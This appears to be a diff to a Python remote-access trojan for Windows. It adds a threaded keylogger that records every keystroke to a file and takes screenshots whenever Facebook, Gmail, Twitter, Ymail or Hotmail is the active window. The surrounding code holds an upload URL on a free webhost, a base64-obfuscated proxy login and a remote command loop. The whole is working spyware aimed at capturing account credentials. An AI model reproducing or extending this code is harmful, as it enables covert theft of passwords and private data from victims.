@@ -1,5 +1,6 @@
 import socket
 import tempfile
+import threading
 from PIL import ImageGrab
 from base64 import b64decode
 import platform
@@ -14,11 +15,62 @@ import json
 from datetime import datetime
 from hashlib import md5
 import requests
+import pyperclip
+import pythoncom, pyHook
+import win32gui
 
 uploadURL = 'http://monohydric-variatio.000webhostapp.com/upload.php'
 identification = {}
 botname = ''
 proxy = {'http': "http://" + b64decode("cml0MjAxNTA0NA==") + ":" + b64decode("SWlpdGEwNDQ=") + "@172.31.1.6:8080"}
+running = False
+store = ''
+listOfWindows = ['Facebook', 'Gmail', 'Twitter', 'Hotmail', 'Ymail', 'Yandex']
+obj = pyHook.HookManager()
+
+
+def keypressed(event):
+    # Take a screenshot if any of the mentioned website is in the front screen
+    w = win32gui
+    windowText = w.GetWindowText(w.GetForegroundWindow())
+    if 'Facebook' in windowText or 'Gmail' in windowText or 'Twitter' in windowText \
+            or 'Ymail' in windowText or 'Hotmail' in windowText:
+        screenshot()
+    global store
+    print chr(event.Ascii)         # Print key info
+
+    if event.Ascii == 13:
+        keys = '< ENTER >'
+    elif event.Ascii == 8:
+        keys = '<BSpace>'
+    else:
+        keys = chr(event.Ascii)
+
+    store += keys
+    fp = open('keylogs.txt', 'a+')
+    fp.write(store)
+    fp.close()
+    return True
+
+
+def keylogger():
+    obj.KeyDown = keypressed
+    obj.HookKeyboard()
+    pythoncom.PumpMessages()
+
+
+class myThread (threading.Thread):
+    def __init__(self, threadID, name, counter):
+        threading.Thread.__init__(self)
+        self.threadID = threadID
+        self.name = name
+        self.counter = counter
+
+    def run(self):
+        keylogger()
+
+
+thread1 = myThread(1, 'keylogThread', 1)
 
 
 def transfer(s, path):
@@ -167,15 +219,12 @@ def initialize():
     key.Close()
 
 
-def md5(fname):  # Use this  to check successful transfer of data
+def md5Hash(fname):  # Use this  to check successful transfer of data
     hash_md5 = md5()  # From http://stackoverflow.com/questions/3431825/generating-an-md5-checksum-of-a-file
     with open(fname, "rb") as f:
         for chunk in iter(lambda: f.read(4096), b""):
             hash_md5.update(chunk)
     return hash_md5.hexdigest()
-
-
-initialize()
 
 
 def connect():
@@ -187,6 +236,7 @@ def connect():
         command = s.recv(1024)
         if 'terminate' in command:
             s.close()
+            thread1.name.exit()
             break
 
         elif 'grab' in command:
@@ -227,6 +277,7 @@ def connect():
 
 
 def main():
+    thread1.start()
     initialize()
     connect()
 
